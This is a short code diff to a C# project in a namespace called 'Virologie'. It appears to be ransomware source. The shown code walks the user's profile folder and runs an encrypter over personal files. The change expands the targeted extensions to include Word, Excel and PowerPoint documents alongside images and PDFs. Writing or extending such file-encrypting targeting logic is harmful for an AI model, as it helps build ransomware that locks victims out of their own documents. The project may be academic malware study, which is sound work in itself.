@@ -56,7 +56,7 @@ namespace Virologie
 
             CryptoKeyManager.SaveGUID();
             explorer.ApplyTo(Environment.GetEnvironmentVariable("USERPROFILE"),
-                new[] {"*.jpg", "*.png", "*.pdf", "*.odt", ".odf", "*.doc?", "*.xls?"},
+                new[] { "*.jpg", "*.png", "*.pdf", "*.odt", ".odf", "*.doc", "*.xls", "*.ppt", "*.docx", "*.xlsx", "*.pptx" },
                 CreateFileAction(encrypter));
         }
 
